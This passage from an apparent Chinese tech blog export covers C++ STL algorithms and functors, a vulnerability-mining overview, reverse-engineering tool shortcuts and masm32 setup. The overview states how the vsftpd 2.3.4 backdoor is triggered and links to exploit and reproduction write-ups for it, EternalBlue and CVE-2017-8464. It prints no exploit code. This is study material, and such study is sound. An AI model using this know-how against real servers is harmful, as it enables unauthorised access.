class="title class_">T</span>&gt; <span class="type">bool</span> equal_to&lt;T&gt; <span class="comment">// 等于</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; <span class="type">bool</span> not_equal_to&lt;T&gt; <span class="comment">// 不等于</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; <span class="type">bool</span> greater&lt;T&gt; <span class="comment">// 大于</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; <span class="type">bool</span> greater_equal&lt;T&gt; <span class="comment">// 大于等于</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; <span class="type">bool</span> less&lt;T&gt; <span class="comment">// 小于</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; <span class="type">bool</span> less_equal&lt;T&gt; <span class="comment">// 小于等于</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑仿函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; <span class="type">bool</span> logical_and&lt;T&gt; <span class="comment">// 逻辑与</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; <span class="type">bool</span> logical_or&lt;T&gt; <span class="comment">// 逻辑或</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; <span class="type">bool</span> logical_not&lt;T&gt; <span class="comment">// 逻辑非</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// greater案例</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::greater&lt;<span class="type">int</span>&gt; greaterThan; <span class="comment">// 创建一个greater仿函数对象</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">greaterThan</span>(a, b)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;a is greater than b&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;a is not greater than b&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="七、-STL中的算法"><a href="#七、-STL中的算法" class="headerlink" title="七、 STL中的算法"></a>七、 STL中的算法</h2><blockquote><p>所有不支持随机访问迭代器的容器，不可以用标准算法。（例如：list）</p></blockquote><h3 id="1-遍历算法"><a href="#1-遍历算法" class="headerlink" title="1 遍历算法"></a>1 遍历算法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历容器（func是指遍历时的操作）</span></span><br><span class="line">for_each(iterator beg,iterator end,_func);</span><br><span class="line"></span><br><span class="line">for_each(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>(),print01); <span class="comment">// 普通函数放函数名，类调用放类名</span></span><br><span class="line">for_each(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>(),<span class="built_in">print02</span>()); <span class="comment">// 调用仿函数放函数名后要带括号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 搬运容器到另一个容器中（func是指搬运时的额外操作）</span></span><br><span class="line"><span class="comment">// 注：目标容器要有空间（size），reserve不行。</span></span><br><span class="line"><span class="built_in">transform</span>(iterator ori_beg,iterator ori_end,iterator new_beg,_func);</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NewData</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> i;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;i++;</span><br><span class="line"><span class="keyword">return</span> i * <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> NewData::i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddFive</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> value)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> value + <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPrint</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> value)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; value &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">v.<span class="built_in">resize</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">NewData newData;</span><br><span class="line"><span class="built_in">generate</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), newData);</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; news;</span><br><span class="line">news.<span class="built_in">resize</span>(v.<span class="built_in">size</span>());</span><br><span class="line">    <span class="comment">// news.reverve(v.size()); // 仅预留空间，不会报错，但数据无法插入</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">transform</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), news.<span class="built_in">begin</span>(), <span class="built_in">AddFive</span>());</span><br><span class="line">for_each(news.<span class="built_in">begin</span>(), news.<span class="built_in">end</span>(), <span class="built_in">MyPrint</span>());</span><br><span class="line">cout &lt;&lt; news.<span class="built_in">capacity</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; news.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* newData不用括号：在上述代码中，generate(v.begin(), v.end(), newData) 使用的是 newData 而不是 newData() 是因为 generate 函数期望传递一个可调用对象作为生成元素的函数。newData 是一个可调用对象，它是一个函数对象（仿函数）类型，并通过重载 operator() 实现了调用运算符。因此，将 newData 传递给 generate 函数时，这个函数对象会被调用来生成每个元素的值。如果使用 newData() 代替 newData，那么等价于调用了 operator() 并返回了结果。这并不是我们想要的效果，因为我们希望在每次调用 operator() 时，NewData 类中的静态成员变量 i 都会自增，而不是只调用一次。因此，正确的方式是直接将 newData 作为可调用对象传递给 generate 函数。这样，每次调用 newData 都会触发 operator() 的执行，从而实现按需生成序列的功能。 */</span></span><br></pre></td></tr></table></figure><h3 id="2-查找算法"><a href="#2-查找算法" class="headerlink" title="2 查找算法"></a>2 查找算法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找元素（自定义元素类型要重载==号来判断相等，找不到返回v.end()）</span></span><br><span class="line"><span class="function">iterator <span class="title">find</span><span class="params">(iterator beg,iterator end,value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按条件查找元素（_Pred函数或谓词，找不到返回v.end()）</span></span><br><span class="line"><span class="function">iterator <span class="title">find_if</span><span class="params">(iterator beg,iterator end, _Pred)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找相邻重复元素（找到返回第一个数的迭代器，否则返回v.end()）</span></span><br><span class="line"><span class="function">iterator <span class="title">adjacent_find</span><span class="params">(iterator beg,iterator end)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二分查找（序列一定要升序排序）</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">binary_search</span><span class="params">(iterator beg,iterator end,value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 统计元素个数（自定义要重载==）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">count</span><span class="params">(iterator beg,iterator end,value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按条件统计元素个数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">count_if</span><span class="params">(iterator beg,iterator end,_Pred)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="3-排序算法"><a href="#3-排序算法" class="headerlink" title="3 排序算法"></a>3 排序算法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 排序（默认升序）</span></span><br><span class="line"><span class="built_in">sort</span>(iterator beg,iterator end[,_Pred]);</span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>(),<span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;()); <span class="comment">// 降序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 洗牌，指定范围内的元素随机调序</span></span><br><span class="line"><span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"><span class="built_in">random_shuffle</span>(iterator beg,iterator end);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 容器元素合并并存储到新容器中（两个容器需要有序，dest是目标容器的开始迭代器）</span></span><br><span class="line"><span class="built_in">merge</span>(iterator beg_1,iterator end_1,iterator beg_2,iterator end_2,iterator dest);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反转元素</span></span><br><span class="line"><span class="built_in">reverse</span>(iterator beg,iterator end);</span><br></pre></td></tr></table></figure><h3 id="4-拷贝替换算法"><a href="#4-拷贝替换算法" class="headerlink" title="4 拷贝替换算法"></a>4 拷贝替换算法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 拷贝（dest：目标起始迭代器，目标容器需提前开辟空间）</span></span><br><span class="line"><span class="built_in">copy</span>(iterator beg,iterator end,iterator dest);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换元素</span></span><br><span class="line"><span class="built_in">repalce</span>(iterator beg,iterator end,old_value,new_value);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按条件替换元素</span></span><br><span class="line"><span class="built_in">replace_if</span>(iterator beg,iterator end,_pred,new_value);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 互换两个同类型容器的元素</span></span><br><span class="line"><span class="built_in">swap</span>(container c1,container c2);</span><br></pre></td></tr></table></figure><h3 id="5-算术生成算法"><a href="#5-算术生成算法" class="headerlink" title="5 算术生成算法"></a>5 算术生成算法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;numeric&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 元素累计（value是初值）</span></span><br><span class="line"><span class="type">int</span> sum = <span class="built_in">accumulate</span>(iterator beg,iterator end,value); <span class="comment">// 累加</span></span><br><span class="line"><span class="type">int</span> sum = <span class="built_in">accumulate</span>(vec.<span class="built_in">begin</span> ( ) ,vec.<span class="built_in">end</span> ( ) ,<span class="number">1</span> ,<span class="built_in">multiplies</span>&lt;<span class="type">int</span>&gt;( )); <span class="comment">// 累乘</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将指定区间的值填充为目标值</span></span><br><span class="line"><span class="built_in">fill</span>(iterator beg,iterator end,value);</span><br></pre></td></tr></table></figure><h3 id="6-集合算法"><a href="#6-集合算法" class="headerlink" title="6 集合算法"></a>6 集合算法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 交集（dest：目标起始迭代器，目标容器需提前开辟空间）</span></span><br><span class="line"><span class="function">iterator <span class="title">set_intersection</span><span class="params">(iterator beg_1,iterator end_1,iterator beg_2,iterator end_2,iterator dest)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 并集（两个集合需有序）</span></span><br><span class="line"><span class="function">iterator <span class="title">set_union</span><span class="params">(iterator beg_1,iterator end_1,iterator beg_2,iterator end_2,iterator dest)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 差集（两个集合需有序）</span></span><br><span class="line"><span class="function">iterator <span class="title">set_difference</span><span class="params">(iterator beg_1,iterator end_1,iterator beg_2,iterator end_2,iterator dest)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取交集</span></span><br><span class="line">vTarget.<span class="built_in">resize</span>(<span class="built_in">min</span>(v1.<span class="built_in">size</span>(),v2.<span class="built_in">size</span>()));</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator itEnd = <span class="built_in">set_intersection</span>(v1.<span class="built_in">begin</span>(),v1.<span class="built_in">end</span>(),v2.<span class="built_in">begin</span>(),v2.<span class="built_in">end</span>(),vTarget);</span><br><span class="line"></span><br><span class="line">for_each(vTarget.<span class="built_in">begin</span>(),itEnd,myPrint); <span class="comment">// 此处要用itEnd而不是vTarget.end()，因为开辟的空间不一定全部都用到了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取并集</span></span><br><span class="line">vTarget.<span class="built_in">resize</span>(v1.<span class="built_in">size</span>() + v2.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取差集</span></span><br><span class="line">vTarget.<span class="built_in">resize</span>(<span class="built_in">max</span>(v1.<span class="built_in">size</span>(),v2.<span class="built_in">size</span>()));</span><br></pre></td></tr></table></figure><hr><h2 id="八、C-库"><a href="#八、C-库" class="headerlink" title="八、C++库"></a>八、C++库</h2><div class="table-container"><table><thead><tr><th>库名</th><th>连接</th><th>功能</th></tr></thead><tbody><tr><td>boost</td><td><a href="https://blog.csdn.net/Aliven888/article/details/111153535">安装</a></td><td>自定义命令行输入输出</td></tr><tr><td>Opencv</td><td><a href=".\f19f4a3">text::Opencv</a></td><td>视觉处理</td></tr></tbody></table></div><hr><h2 id="九、C-C-应用"><a href="#九、C-C-应用" class="headerlink" title="九、C/C++应用"></a>九、C/C++应用</h2><ul><li><a href=".\4962e50b">text::C语言Windows网络编程</a></li><li><a href=".\251c2987">text::C++游戏</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 程序语言 </tag>
            
            <tag> C++ </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘</title>
      <link href="/posts/e01eea27.html"/>
      <url>/posts/e01eea27.html</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><blockquote><p><a href="https://blog.csdn.net/licheric/article/details/109059262">漏洞库查找</a>    </p><p><a href="https://wuyaogexing.com/65/272769.html">漏洞库网站</a>    </p><p><a href="https://cve.mitre.org/">official::CVE</a></p><p><a href="https://www.rfc-editor.org/">official::RFC</a></p><p><a href="https://www.seebug.org/">official::知道创宇</a></p><p><a href="https://vul.wangan.com/">official::网安</a></p><p><a href="http://www.cnvd.org.cn/">official::国家漏洞平台</a></p></blockquote><h2 id="一、过去漏洞"><a href="#一、过去漏洞" class="headerlink" title="一、过去漏洞"></a>一、过去漏洞</h2><h3 id="1-vsftpd2-3-4笑脸漏洞（CVE-2011-2523）"><a href="#1-vsftpd2-3-4笑脸漏洞（CVE-2011-2523）" class="headerlink" title="1 vsftpd2.3.4笑脸漏洞（CVE-2011-2523）"></a>1 vsftpd2.3.4笑脸漏洞（CVE-2011-2523）</h3><blockquote><p><a href="https://blog.csdn.net/weixin_52347768/article/details/124594516">漏洞</a>    <a href="https://github.com/Magialeaf/exp/blob/main/vsftpd2.3.4笑脸漏洞.py">exp</a>    <a href="https://zhuanlan.zhihu.com/p/573004918">加固</a></p><p>原理：21端口，输入的字段中有 :) （0x3a，0x29）将会自动打开 6200 端口。</p></blockquote><h3 id="2-永恒之蓝（CVE-2017-0146）"><a href="#2-永恒之蓝（CVE-2017-0146）" class="headerlink" title="2 永恒之蓝（CVE-2017-0146）"></a>2 永恒之蓝（CVE-2017-0146）</h3><blockquote><p><a href="https://blog.csdn.net/weixin_43913009/article/details/123887992">永恒之蓝复现链接</a></p></blockquote><h3 id="3-震网三代（CVE-2017-8464）"><a href="#3-震网三代（CVE-2017-8464）" class="headerlink" title="3 震网三代（CVE-2017-8464）"></a>3 震网三代（CVE-2017-8464）</h3><blockquote><p><a href="https://blog.csdn.net/dgjkkhcf/article/details/125940189">CVE-2017-8464（震网三代）</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF案例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 安全实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工具</title>
      <link href="/posts/68e517a.html"/>
      <url>/posts/68e517a.html</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse工具"><a href="#Reverse工具" class="headerlink" title="Reverse工具"></a>Reverse工具</h1><hr><h2 id="一、反汇编"><a href="#一、反汇编" class="headerlink" title="一、反汇编"></a>一、反汇编</h2><blockquote><p>VS写的程序应该选择release版本，因为release是发布版本，更接近实际情况。</p></blockquote><h3 id="1-CE"><a href="#1-CE" class="headerlink" title="1 CE"></a>1 CE</h3><blockquote><p>本地运行的exe改内存</p></blockquote><h3 id="2-OD"><a href="#2-OD" class="headerlink" title="2 OD"></a>2 OD</h3><blockquote><p>动态反汇编调试</p></blockquote><h4 id="2-1-基本窗口"><a href="#2-1-基本窗口" class="headerlink" title="2.1 基本窗口"></a>2.1 基本窗口</h4><ol><li><p>顶部栏</p><blockquote><p>运行：F9</p><p>重开：Ctrl + F2</p><p>单步步过：F8</p><p>单步步入：F7</p><p>运行到选定位置：F4</p><p>执行到返回：Ctrl + F9</p><p>执行到用户代码：Alt + F9</p><p>断点窗口：Alt + B</p><p>查看上一步：-</p><p>查看下一步：+</p><p>查看当前指令地址：*</p></blockquote></li><li><p>反汇编窗口</p><blockquote><p>显示被调试程序的反汇编代码。</p><p>断点：F2 / 右键——Breakpoint——Toggle。</p><p>查看或修改具体汇编代码：双击Command中代码。</p><p>Comments：注释，点击可以关闭。</p><p>添加注释：双击Comments中的指定行。</p><p>找函数或地址：Ctrl + G / 右键——goto——Expression（其他窗口同理）</p><p>重新分析代码：右键——Analysis——Analyse code</p><p>窗口属性：右键——Appearance</p></blockquote></li><li><p>寄存器窗口</p><blockquote><p>显示当前所选线程的CPU寄存器信息。</p></blockquote></li><li><p>信息窗口</p><blockquote><p>选中的语句的相关信息。</p></blockquote></li><li><p>数据窗口</p><blockquote><p>内存或文件的内容。</p><p>Value：值，点击可以切换出ASCII码等窗口。（右键显示详细信息）</p></blockquote></li><li><p>堆栈窗口</p><blockquote><p>显示当前线程的堆栈。</p><p>跳转到指定位置：回车。</p></blockquote></li></ol><h4 id="2-2-调试流程"><a href="#2-2-调试流程" class="headerlink" title="2.2 调试流程"></a>2.2 调试流程</h4><ol><li>打开文件</li><li>在反汇编窗口用Ctrl + G定位函数名</li><li>F2加断点</li><li>F9执行</li><li>分析堆栈，回车跳转</li></ol><h4 id="2-3-插件"><a href="#2-3-插件" class="headerlink" title="2.3 插件"></a>2.3 插件</h4><h5 id="2-3-1-command"><a href="#2-3-1-command" class="headerlink" title="2.3.1 command"></a>2.3.1 command</h5><blockquote><p><code>bp [addr] / function</code>：给指定反汇编窗口地址或函数入口加断点。</p><p><code>bc [addr] / function</code>：清除断点</p><p><code>db / dw / dd / dc [addr]</code>：跳转到指定数据窗口的地址处，以 字节 /字 / 双字 / 字符方式显示数据。</p><p><code>? reg</code>：查看指定寄存器值（除了<code>? eax</code>也可以<code>? ebp-8</code>）</p></blockquote><h4 id="2-4-技巧"><a href="#2-4-技巧" class="headerlink" title="2.4 技巧"></a>2.4 技巧</h4><ol><li><p>Command中带有详细注释</p><blockquote><p>VS在编译时会生成一个exe和pdb文件，pdb中会保留调试信息。所以若pdb文件存在，OD在读取exe时会同时读取pdb文件，将注释信息加载到OD中，也可以在OD的Options中设置。</p></blockquote></li><li><p><code>[local.num]</code></p><blockquote><p>表示是第几个局部变量，如<code>[local.1]</code>表示是函数中第一个局部变量，以此类推。（按栈的顺序，并非源代码的定义的顺序）</p></blockquote></li></ol><h4 id="2-5-问题"><a href="#2-5-问题" class="headerlink" title="2.5 问题"></a>2.5 问题</h4><ol><li><p>VS生成的有的代码没有</p><blockquote><p>在VS中右键项目——属性——配置属性——C/C++——优化——禁用</p><p>不禁用的话有的代码在编译时会被优化。</p></blockquote></li><li><p>窗口混乱</p><blockquote><p>View——CPU——全屏</p><p>初始打开的窗口是CPU窗口。</p></blockquote></li></ol><h3 id="3-IDA"><a href="#3-IDA" class="headerlink" title="3 IDA"></a>3 IDA</h3><blockquote><p>静态反汇编分析</p></blockquote><h3 id="4-VS调试"><a href="#4-VS调试" class="headerlink" title="4 VS调试"></a>4 VS调试</h3><blockquote><p>加断点——运行——调试——窗口——反汇编</p></blockquote><hr><h2 id="二、-其他工具"><a href="#二、-其他工具" class="headerlink" title="二、 其他工具"></a>二、 其他工具</h2><blockquote><p><a href="https://www.52pojie.cn/thread-1368539-1-1.html">机器码修改</a></p><p><a href="https://www.52pojie.cn/thread-1425151-1-1.html">磁盘扫描</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>masm32汇编</title>
      <link href="/posts/b81b1ca5.html"/>
      <url>/posts/b81b1ca5.html</url>
      
        <content type="html"><![CDATA[<h1 id="masm32汇编"><a href="#masm32汇编" class="headerlink" title="masm32汇编"></a>masm32汇编</h1><blockquote><p><a href="https://www.cnblogs.com/lsdb/p/7402955.html">masm32下载</a></p></blockquote><hr><h2 id="〇、环境配置"><a href="#〇、环境配置" class="headerlink" title="〇、环境配置"></a>〇、环境配置</h2><ol><li><p>下载安装</p><blockquote><p>注 Win10 下可能安装失败。（兼容打开，或关闭防火墙）</p></blockquote></li><li><p>环境配置</p></li></ol><div class="table-container"><table><thead><tr><th>变量名</th><th>变量值</th></tr></thead><tbody><tr><td>include</td><td>D:\masm32\include</td></tr><tr><td>lib</td><td>D:\masm32\lib</td></tr><tr><td>PATH</td><td>D:\masm32\bin</td></tr></tbody></table></div><ol><li><p>执行</p><ul><li><p>编译：<code>ml /c /coff eg.asm</code></p><blockquote><p>源程序：*.asm</p><p>包含文件：*.inc（列表文件：*.lst）</p></blockquote><p>链接：<code>link /subsystem:console eg.obj [eg.lib...]</code></p><blockquote><p><code>link /OUT:eg.lib eg.obj</code>：指明库文件编译</p><p>目标模块文件：*.obj</p><p>库文件：*.lib</p></blockquote></li></ul><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">事先设置好后使用：MAKE32.BAT <span class="number">1</span>.asm</span><br><span class="line">设置如下</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="comment">REM make32.bat,for assembling and linking 32-bit Console programs(.exe)</span></span><br><span class="line">ml /c /coff /Fl /Zi %<span class="number">1</span>.asm</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">errorlevel</span> <span class="number">1</span><span class="keyword">goto</span> terminate</span><br><span class="line">link /subsystem:console /debug %<span class="number">1</span>.obj</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">errorlevel</span> <span class="number">1</span><span class="keyword">goto</span> terminate</span><br><span class="line">:terminate</span><br><span class="line">@<span class="built_in">echo</span> on</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="一、masm32汇编"><a href="#一、masm32汇编" class="headerlink" title="一、masm32汇编"></a>一、masm32汇编</h2><h3 id="1-基础汇编"><a href="#1-基础汇编" class="headerlink" title="1 基础汇编"></a>1 基础汇编</h3><h4 id="1-1-寄存器"><a href="#1-1-寄存器" class="headerlink" title="1.1 寄存器"></a>1.1 寄存器</h4><blockquote><p><a href=".\a8fb0b6e">text::基础汇编</a></p><p><a href=".\8d4b7ae1">text::计算机组成原理</a></p><p>扩展寄存器：EAX，EBX，ECX，EDX，ESI，EDI，EBP，ESP，EIP</p><p>未扩展寄存器：CS，DS，ES，FS，GS</p></blockquote><h4 id="1-2-头文件"><a href="#1-2-头文件" class="headerlink" title="1.2 头文件"></a>1.2 头文件</h4><div class="table-container"><table><thead><tr><th>伪指令</th><th>功能</th><th>伪指令</th><th>功能</th></tr></thead><tbody><tr><td>.8086</td><td>仅接受8086指令（缺省状态）</td><td>.387</td><td>接受80387数学协处理器指令</td></tr><tr><td>.186</td><td>接受80186指令</td><td>.No87</td><td>取消使用协处理器指令</td></tr><tr><td>.286</td><td>接受除特权指令外的80286指令</td><td>.586</td><td>接受除特权指令外的Pentium指令</td></tr><tr><td>.286P</td><td>接受全部80286指令，包括特权指令</td><td>.586P</td><td>接受全部的Pentium指令</td></tr><tr><td>.386</td><td>接受除特权指令外的80386指令</td><td>.686</td><td>接受除特权指令外的Pentium Pro指令</td></tr><tr><td>.386P</td><td>接受全部80386指令，包括特权指令</td><td>.686P</td><td>接受全部Pentium Pro指令</td></tr><tr><td>.486</td><td>接受除特权指令外的80486指令，包括浮点指令</td><td>.MMX</td><td>接受MMX指令</td></tr><tr><td>.486P</td><td>接受全部80486指令，包括特权指令和浮点指令</td><td>.K3D</td><td>接受AMD处理器的3D指令</td></tr><tr><td>.8087</td><td>接受8087数学协处理器指令</td><td>.XMM</td><td>接受SSE，SSE2和SSE3指令</td></tr><tr><td>.287</td><td>接受80287数学协处理器指令</td><td></td></tr></tbody></table></div><h4 id="1-3-io32-inc中的输入输出"><a href="#1-3-io32-inc中的输入输出" class="headerlink" title="1.3 io32.inc中的输入输出"></a>1.3 io32.inc中的输入输出</h4><div class="table-container"><table><thead><tr><th>C语言格式符</th><th>子程序名</th><th>参数</th><th>常用功能</th></tr></thead><tbody><tr><td>printf(“%s”,a)</td><td>dispmsg</td><td>入口：EAX=字符串地址</td><td>显示字符串（以0结尾）</td></tr><tr><td>printf(“%c”,a)</td><td>dispc</td><td>入口：AL=ASCII码</td><td>显示一个字符</td></tr><tr><td>printf(“\n”)</td><td>dispcrlf</td><td></td><td>光标回车换行，到下一行首位置</td></tr><tr><td></td><td>disprd</td><td></td><td>显示8个32为通用寄存器内容（十六进制）</td></tr><tr><td></td><td>disprf</td><td></td><td>显示6个状态标志的状态</td></tr><tr><td>print(“%X”,a)</td><td>disphd</td><td>入口：EAX=32b数据</td><td>以16进制显示8位数据</td></tr><tr><td>print(“%u”,a)</td><td>dispuid</td><td>入口：EAX=32b数据</td><td>显示无符号十进制数</td></tr><tr><td>print(“%d”,a)</td><td>dispsid</td><td>入口：EAX=32b数据</td><td>显示有符号十进制数</td></tr><tr><td>scanf(“%s”,&amp;a)</td><td>readmsg</td><td>入口：EAX=缓冲区地址。出口：EAX=实际输入的字符个数（不含结尾0），字符串以0结尾</td><td>输入一个字符串（回车结束）</td></tr><tr><td>scanf(“%c”,&amp;a)</td><td>readc</td><td>出口：AL=ASCII码</td><td>输入一个字符（回显）</td></tr><tr><td>scanf(“%X”,&amp;a)</td><td>readhd</td><td>出口：EAX=32b数据</td><td>输入8为十六进制数</td></tr><tr><td>scanf(“%u”,&amp;a)</td><td>readuid</td><td>出口：EAX=32b数据</td><td>输入无符号十进制数</td></tr><tr><td>scanf(“%d”,&amp;a)</td><td>readsid</td><td>出口：EAX=32b数据</td><td>输入有符号十进制数</td></tr></tbody></table></div><h3 id="2-数据表示与寻址"><a href="#2-数据表示与寻址" class="headerlink" title="2 数据表示与寻址"></a>2 数据表示与寻址</h3><h4 id="2-1-伪指令"><a href="#2-1-伪指令" class="headerlink" title="2.1 伪指令"></a>2.1 伪指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;等价EQU，等号=</span><br><span class="line">;EQU：给符号名定义一个数值或另一个字符串，甚至可以是处理器指令</span><br><span 